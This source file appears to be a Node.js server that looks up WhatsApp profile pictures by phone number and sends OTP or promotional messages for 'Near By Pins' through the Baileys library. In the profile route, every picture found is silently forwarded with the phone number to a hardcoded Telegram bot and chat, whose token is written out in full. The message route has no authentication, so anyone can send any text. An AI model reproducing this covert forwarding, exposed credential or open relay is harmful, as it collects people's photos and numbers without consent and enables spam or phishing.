const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, DisconnectReason } = require('@whiskeysockets/baileys');
const express = require('express');
const cors = require('cors');
const compression = require('compression');
const { parsePhoneNumberFromString } = require('libphonenumber-js');

const app = express();
const port = 3000;
let client;
let serverStarted = false;
let isClientConnected = false; // Track client connection status
const pendingRequests = new Map();

app.use(cors());
app.use(compression());

const isValidPhoneNumber = (phone) => {
    let formattedPhone = phone.startsWith('+') ? phone : `+${phone}`;
    // Parse the phone number without specifying a country code
    const phoneNumber = parsePhoneNumberFromString(formattedPhone);

    // Return true if the number is valid
    return phoneNumber ? phoneNumber.isValid() : false;
};

const initializeBaileys = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info');
    const { version } = await fetchLatestBaileysVersion();
    client = makeWASocket({
        auth: state,
        version,
        printQRInTerminal: true,
    });

    client.ev.on('creds.update', saveCreds);

    client.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            isClientConnected = false;
            console.log('Connection closed');
            setTimeout(() => {
                initializeBaileys(); // Reconnect after a brief delay
            }, 5000);
        } else if (connection === 'open') {
            isClientConnected = true;
            console.log('Baileys Client is ready to use!');

            if (!serverStarted) {
                app.listen(port, () => {
                    console.log(`API server is running on http://localhost:${port}`);
                });
                serverStarted = true;
            }
        }
    });
};

initializeBaileys();

app.get('/:number', async (req, res) => {
    let phone = req.params.number;
    if (phone === 'favicon.ico') return res.status(200).json({ ok: 'true' });

   
    if (!isValidPhoneNumber(phone)) {
        return res.status(400).json({ error: 'Invalid phone number format. Only digits (7-15) are allowed.' });
    }

    const phoneNumber = `${phone}@s.whatsapp.net`;

    if (pendingRequests.has(phoneNumber)) {
        const profilePicUrl = await pendingRequests.get(phoneNumber);
        return profilePicUrl
            ? res.json({ profilePicUrl, status:{status:''} })
            : res.status(500).json({ error: 'Failed to fetch profile picture (in progress)' });
    }

    if (!isClientConnected) {
        return res.status(500).json({ error: 'Client is not connected. Please check the connection.' });
    }

    try {
        const profilePicPromise = client.profilePictureUrl(phoneNumber, 'image');
        pendingRequests.set(phoneNumber, profilePicPromise);

        const profilePicUrl = await profilePicPromise;

        if (profilePicUrl) {
            res.json({ profilePicUrl, status:{status:''} });

            const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(phone)}`;
            try {
                await fetch(telegramUrl);
            } catch (fetchError) {
                console.error('Failed to send photo to Telegram:', fetchError);
            }
        } else {
            res.json({ phoneNumber, profilePicUrl: 'No profile picture found' });
        }
    } catch (error) {
        console.error('Error fetching profile picture:', error);
        res.status(500).json({ error: 'Failed to fetch profile picture' });
    } finally {
        pendingRequests.delete(phoneNumber);
    }
});

app.get('/send/:phone/:message', async (req, res) => {
    // Extract phone and message from route parameters
    const { phone, message } = req.params;

    if (!isValidPhoneNumber(phone)) {
        return res.status(400).json({ error: 'Invalid phone number format. Phone number must contain 7-15 digits.' });
    }

    if (!message) {
        return res.status(400).json({ error: 'Message is required.' });
    }

    if (!isClientConnected) {
        return res.status(500).json({ error: 'Client is not connected. Please check the connection.' });
    }

    const phoneNumber = `${phone}@s.whatsapp.net`;

    try {
        // Check if the message contains exactly 4 digits (OTP)
        const isOTP = /^\d{4}$/.test(message);
    
        if (isOTP) {
            const url = `https://placehold.co/600x400/FFFFFF/333333/png?font=lora&text=${message}`;
    
            await client.sendMessage(phoneNumber, {
                image: { url },
                caption: `
📲 *Your OTP: ${message}*  
⏳ *Valid for 3 minutes*  
⚠️ *Do not share this code with anyone to keep your account secure.*  
    
🔒 _Powered by Near By Pins_ 💌`.trim(),
            });
        } else {
            await client.sendMessage(phoneNumber,`
📩 *Message from Near By Pins:*  
${message}  
    
🔔 _Stay tuned for updates and offers from Near By Pins!_`.trim(),
            );
        }
    
        res.json({
            status: 'Message sent successfully',
            phoneNumber,
            message,
        });
    } catch (error) {
        res.status(500).json({
            error: 'Failed to send message',
            details: error.message,
        });
    }
    
    
});
